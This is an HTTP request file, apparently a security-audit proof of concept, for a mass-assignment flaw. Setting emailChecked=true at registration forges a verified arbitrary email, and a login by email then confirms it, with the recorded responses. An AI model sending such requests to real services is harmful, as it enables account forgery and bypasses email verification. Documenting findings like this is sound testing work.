@@ -1,0 +1,18 @@
+### VULN-006 — registration mass-assignment (emailChecked / arbitrary email)
+### (1) Anonymous registration injecting a "verified" arbitrary email
+### NOTE: bean property is `name`, NOT `username`.
+POST /doRegister HTTP/1.1
+Host: localhost:20000
+Content-Type: application/x-www-form-urlencoded
+
+name=poc_<suffix>&nickname=poc_<suffix>&password=Passw0rd!23&repassword=Passw0rd!23&email=exploit_<suffix>@example.invalid&emailChecked=true
+
+### -> HTTP/1.1 302  Location: /   (success; no error= marker)
+### DB: sys_user row has email_checked=1, arbitrary email, superuser=0
+
+### (2) Prove the forged verified state is load-bearing: log in BY EMAIL
+### (findByEmail returns a user only when emailChecked=true)
+GET /api/login?username=exploit_<suffix>@example.invalid&password=<sha512(Passw0rd!23)>&encoding=sha512&channel=web HTTP/1.1
+Host: localhost:20000
+
+### -> 200 {"authToken":"…","user":{"email":"exploit_<suffix>@example.invalid","emailChecked":true,"id":"3",…}}
